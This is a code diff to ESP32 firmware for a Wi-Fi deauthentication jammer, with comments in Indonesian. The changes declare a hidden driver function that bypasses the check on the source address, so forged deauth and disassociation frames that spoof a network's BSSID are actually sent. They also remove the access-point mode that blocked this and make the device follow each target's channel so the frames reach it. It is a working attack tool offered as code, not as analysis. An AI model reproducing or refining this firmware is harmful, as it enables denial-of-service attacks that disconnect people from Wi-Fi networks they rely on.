@@ -13,6 +13,9 @@
 #include <cstdio>
 #include <cstring>
 
+extern "C" esp_err_t esp_wifi_80211_tx_bypass(
+    wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+
 #define FW_VERSION      "1.0.0-jam"
 #define SERIAL_BAUD     921600
 #define RX_LINE_MAX     1024
@@ -36,7 +39,6 @@ struct Config {
   uint16_t reason      = 7;      // deauth reason code
   bool     broadcast   = true;   // true -> deauth ke broadcast per BSSID
   bool     disassoc    = false;  // true -> subtype disassoc (0xA0)
-  bool     apInterface = true;   // true -> WIFI_IF_AP, false -> WIFI_IF_STA
   uint16_t statsMs     = 2000;   // 0 = matikan status periodik
   uint16_t repeatMs    = 1500;   // kirim ulang AP/client yang sama
   int8_t   rssiMin     = -95;
@@ -95,6 +97,9 @@ static bool     g_jamming = false;
 static uint8_t  g_curCh = 6;
 static uint32_t g_txCount = 0;
 static uint32_t g_txErrors = 0;
+static int      g_txLastErr = 0;
+static uint32_t g_sendCalls = 0;
+static uint32_t g_injectCalls = 0;
 static uint32_t g_sniffFrames = 0;
 static uint32_t g_rxDrops = 0;
 static uint32_t g_ringDrops = 0;
@@ -402,6 +407,7 @@ static uint16_t setStaTargetsFromJson(JsonArray arr) {
 /* ---- TX ---------------------------------------------------------------- */
 
 static void injectFrame(const uint8_t *bssid, const uint8_t *sta) {
+  g_injectCalls++;
   uint8_t frame[26];
   frame[0] = g_cfg.disassoc ? 0xA0 : 0xC0;   // mgmt subtype: deauth / disassoc
   frame[1] = 0x00;
@@ -415,9 +421,14 @@ static void injectFrame(const uint8_t *bssid, const uint8_t *sta) {
   frame[24] = (uint8_t)(g_cfg.reason & 0xFF);
   frame[25] = (uint8_t)((g_cfg.reason >> 8) & 0xFF);
 
-  wifi_interface_t ifx = g_cfg.apInterface ? WIFI_IF_AP : WIFI_IF_STA;
-  esp_err_t err = esp_wifi_80211_tx(ifx, frame, sizeof(frame), false);
-  if (err == ESP_OK) g_txCount++; else g_txErrors++;
+  // Lewati check addr2 di driver supaya spoof BSSID benar-benar keluar.
+  esp_err_t err = esp_wifi_80211_tx_bypass(WIFI_IF_STA, frame, sizeof(frame), false);
+  if (err == ESP_OK) {
+    g_txCount++;
+  } else {
+    g_txErrors++;
+    g_txLastErr = (int)err;
+  }
 }
 
 static uint16_t s_burstLeft = 0;
@@ -427,6 +438,7 @@ static uint16_t s_tCursor = 0;
 static uint16_t s_cCursor = 0;
 
 static void sendNext() {
+  g_sendCalls++;
   uint16_t active = 0;
   for (uint16_t i = 0; i < MAX_TARGETS; i++) if (g_targets[i].used) active++;
   if (!active) return;
@@ -505,7 +517,6 @@ static void emitConfig() {
   p["reason"]       = g_cfg.reason;
   p["broadcast"]    = g_cfg.broadcast;
   p["disassoc"]     = g_cfg.disassoc;
-  p["ap_interface"] = g_cfg.apInterface;
   p["stats_ms"]     = g_cfg.statsMs;
   p["repeat_ms"]    = g_cfg.repeatMs;
   p["rssi_min"]     = g_cfg.rssiMin;
@@ -541,6 +552,10 @@ static void emitStatus() {
   s["clients"]     = s_uniqueSta;
   s["tx"]          = g_txCount;
   s["tx_errors"]   = g_txErrors;
+  s["tx_last_err"] = g_txLastErr;
+  s["send_calls"]  = g_sendCalls;
+  s["inject_calls"] = g_injectCalls;
+  s["burst_left"]  = s_burstLeft;
   s["rx_dropped"]  = g_rxDrops;
   s["ring_dropped"] = g_ringDrops;
 
@@ -596,7 +611,6 @@ static void applyParams(JsonObject p) {
   }
   if (getBool(p, "broadcast", &y)) { g_cfg.broadcast = y; changed = true; }
   if (getBool(p, "disassoc", &y)) { g_cfg.disassoc = y; changed = true; }
-  if (getBool(p, "ap_interface", &y)) { g_cfg.apInterface = y; changed = true; }
   if (getInt(p, "stats_ms", 0, 60000, &x)) {
     g_cfg.statsMs = (uint16_t)x; changed = true;
   }
@@ -662,6 +676,22 @@ static void handleLine(const char *line) {
   if (!strcmp(cmd, "jam_start")) {
     if (s_rx["targets"].is<JsonArray>()) setTargetsFromJson(s_rx["targets"].as<JsonArray>());
     if (s_rx["client_targets"].is<JsonArray>()) setStaTargetsFromJson(s_rx["client_targets"].as<JsonArray>());
+
+    // Kalau target pernah terlihat, ikuti channel-nya supaya TX kena.
+    if (!g_cfg.hop) {
+      for (uint16_t i = 0; i < MAX_TARGETS; i++) {
+        if (!g_targets[i].used) continue;
+        for (uint16_t j = 0; j < MAX_APS; j++) {
+          if (g_aps[j].used && macEq(g_aps[j].bssid, g_targets[i].bssid) && g_aps[j].ch >= 1 && g_aps[j].ch <= 13) {
+            g_cfg.channel = g_aps[j].ch;
+            if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) g_curCh = g_cfg.channel;
+            break;
+          }
+        }
+        break;
+      }
+    }
+
     g_jamming = true;
     s_burstLeft = 0;
     s_tCursor = s_cCursor = 0;
@@ -719,8 +749,9 @@ void setup() {
   uint32_t t0 = millis();
   while (!Serial && (millis() - t0) < 3000) delay(20);
 
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP("wrecon-tx", nullptr, g_cfg.channel, 1, 0);
+  // STA tanpa asosiasi: tidak ada koneksi yang bisa bentrok dengan TX raw.
+  // Jangan hidupkan softAP — itu memicu pengecekan addr2 di driver (258).
+  WiFi.mode(WIFI_STA);
   esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
 
   wifi_promiscuous_filter_t flt = {};
